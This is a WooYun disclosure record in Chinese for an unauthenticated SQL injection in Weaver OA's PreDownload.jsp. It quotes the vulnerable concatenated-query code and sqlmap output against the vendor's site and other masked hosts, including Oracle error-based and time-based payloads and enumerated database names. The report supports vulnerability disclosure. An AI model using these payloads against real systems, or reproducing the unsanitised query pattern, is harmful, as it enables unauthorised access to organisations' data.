{"id": 71797, "wybug_id": "wooyun-2015-0138725", "wybug_title": "泛微OA通用系统存在SQL注入漏洞（官网可复现无需登录）", "wybug_corp": "泛微OA", "wybug_author": "浮萍", "wybug_date": "2015-09-08 15:19", "wybug_open_date": "2015-12-09 19:20", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-13：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-11-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-09：\t细节向公众公开  简要描述： SQL注入 无需登录 详细说明：  问题出在mobile\\plugin中的PreDownload.jsp文件其中\nString url = StringHelper.null2String(request.getParameter(\"url\"));String sessionkey = StringHelper.null2String(request.getParameter(\"sessionkey\"));MpluginServiceImpl pluginService = (MpluginServiceImpl)BaseContext.getBean(\"mpluginServiceImpl\");if(pluginService.verify(sessionkey)) {\tString filepath = \"\";\tString iszip = \"\";\tString filename = \"\";\t\tString hashcode = \"\";\t\tif (!StringHelper.isEmpty(url)) {\t\t\tDataService ds = new DataService();\t\t\tString sql = \"select objname,filetype,filedir,iszip from attach where id = '\"\t\t\t\t\t+ url+\"'\";\t\t\tMap dataMap = ds.getValuesForMap(sql);\t\t\tif (!dataMap.isEmpty()) {\t\t\t\tfilepath = StringHelper.null2String(dataMap.get(\"filedir\"));\t\t\t\tiszip = StringHelper.null2String(dataMap.get(\"iszip\"));\t\t\t\tfilename = StringHelper.null2String(dataMap.get(\"objname\"));\t\t\t} else {\t\t\tfilepath = request.getRealPath(url);\t\t\t}\t\t} else {\t\tfilepath = request.getRealPath(url);\t\tiszip = \"0\";\t\tfilename = filepath.substring(filepath.lastIndexOf(\"/\")+1);\t}\n这里对url并没有过滤可能导致sql注入这里我们首先以官方为例http://**.**.**.**:9085/mobile/plugin/PreDownload.jsp?url=1\n\n\n\n直接sqlmap\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: url (GET)    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: url=1' AND 5516=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(120)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5516=5516) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(98)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND 'DXjL'='DXjL    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: url=1' AND 7465=DBMS_PIPE.RECEIVE_MESSAGE(CHR(114)||CHR(71)||CHR(103)||CHR(119),5) AND 'iLzy'='iLzy---\n数据库\navailable databases [37]:[*] CTXSYS[*] DBSNMP[*] DMSYS[*] EWEAVER[*] EWEAVER5TEST[*] EWEAVERINHOUSE[*] EWEAVERTEST[*] EXFSYS[*] FTOA01[*] FTPOM[*] HR[*] HTF[*] IX[*] MDSYS[*] MOBILEDEMO[*] OE[*] OLAPSYS[*] ORDSYS[*] OUTLN[*] PM[*] PMECOLOGY[*] POWER[*] POWER01[*] SCOTT[*] SH[*] SYS[*] SYSMAN[*] SYSTEM[*] TSMSYS[*] WEAVERIM[*] WFPM[*] WMSYS[*] XDB[*] ZTDBA[*] ZTKG[*] ZZB[*] ZZBMIS3\n与http://**.**.**.**/bugs/wooyun-2015-0124589中的一致   漏洞证明：  再举几个案例http://**.**.**.**/mobile/plugin/PreDownload.jsp?url=1\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: url (GET)    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: url=1' AND 9725=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(120)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (9725=9725) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(107)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND 'byuN'='byuN    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: url=1' AND 8995=DBMS_PIPE.RECEIVE_MESSAGE(CHR(78)||CHR(68)||CHR(105)||CHR(97),5) AND 'TiYk'='TiYk---[22:57:56] [INFO] the back-end DBMS is Oracleweb application technology: JSPback-end DBMS: Oracle\n数据库\navailable databases [21]:[*] APEX_030200[*] APPQOSSYS[*] CTXSYS[*] DBSNMP[*] EWEAVER[*] EXFSYS[*] FLOWS_FILES[*] MDSYS[*] OAWEIFU[*] OLAPSYS[*] ORDDATA[*] ORDSYS[*] OUTLN[*] OWBSYS[*] SCOTT[*] SYS[*] SYSMAN[*] SYSTEM[*] WEIFU[*] WMSYS[*] XDB\nhttp://**.**.**.**//mobile/plugin/PreDownload.jsp?url=1\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: url (GET)    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: url=1' AND 3519=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(120)||CHR(112)||CHR(113)||(SELECT (CASE WHEN (3519=3519) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(118)||CHR(122)||CHR(113)||CHR(62))) FROM DUAL) AND 'qKYb'='qKYb    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: url=1' AND 8926=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)||CHR(99)||CHR(78)||CHR(71),5) AND 'ejvi'='ejvi---\n数据库\navailable databases [19]:[*] APEX_030200[*] APPQOSSYS[*] CTXSYS[*] DBSNMP[*] EWEAVER[*] EXFSYS[*] FLOWS_FILES[*] MDSYS[*] OLAPSYS[*] ORDDATA[*] ORDSYS[*] OUTLN[*] OWBSYS[*] SCOTT[*] SYS[*] SYSMAN[*] SYSTEM[*] WMSYS[*] XDB\nhttp://10.0.0.*/mobile/plugin/PreDownload.jsp?url=1\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: url (GET)    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)    Payload: url=1' AND 2035=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(120)||CHR(106)||CHR(112)||CHR(113)||(SELECT (CASE WHEN (2035=2035) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(107)||CHR(122)||CHR(113)) AND 'NyZn'='NyZn    Type: AND/OR time-based blind    Title: Oracle OR time-based blind    Payload: url=1' OR 9575=DBMS_PIPE.RECEIVE_MESSAGE(CHR(75)||CHR(80)||CHR(117)||CHR(108),5) AND 'rioo'='rioo---\n数据库\navailable databases [19]:[*] APEX_030200[*] APPQOSSYS[*] CTXSYS[*] DBSNMP[*] EWEAVER[*] EXFSYS[*] FLOWS_FILES[*] MDSYS[*] OLAPSYS[*] ORDDATA[*] ORDSYS[*] OUTLN[*] OWBSYS[*] SCOTT[*] SYS[*] SYSMAN[*] SYSTEM[*] WMSYS[*] XDB\nhttp://**.**.**.**/mobile/plugin/PreDownload.jsp?url=1\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: url (GET)    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: url=1' AND 9799=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(113)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (9799=9799) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(122)||CHR(113)||CHR(113)||CHR(62))) FROM DUAL) AND 'VxQf'='VxQf    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: url=1' AND 8957=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(66)||CHR(69)||CHR(74),5) AND 'lkVv'='lkVv---[23:18:02] [INFO] the back-end DBMS is Oracleweb application technology: JSPback-end DBMS: Oracle\n数据库\navailable databases [28]:[*] APEX_030200[*] APPQOSSYS[*] CTXSYS[*] DBSNMP[*] EWEAVER[*] EWEAVERTEST[*] EWEAVERTEST1[*] EXFSYS[*] FLOWS_FILES[*] HR[*] IX[*] MDSYS[*] MOBILE40[*] MOBILE41[*] OE[*] OLAPSYS[*] ORDDATA[*] ORDSYS[*] OUTLN[*] OWBSYS[*] PM[*] SCOTT[*] SH[*] SYS[*] SYSMAN[*] SYSTEM[*] WMSYS[*] XDB\nhttp://**.**.**.**//mobile/plugin/PreDownload.jsp?url=1%27 \n\n   修复方案：     版权声明：转载请注明来源 浮萍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-09-10 19:18 厂商回复： CNVD确认所述情况，已经由CNVD通过以往建立的处置渠道向软件生产厂商通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-09-06 15:34 |    \t\t有归于无 \t\t\t( 实习白帽子  |\t\t\t        Rank:98 漏洞数:20        | 有归于无)\t\t \n  a8-v5?    \n     2015-09-11 02:11 |    \t\t坏男孩-A_A \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:4        | 菜鸟一枚)\t\t \n  坐等是哪个版本的！！！！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}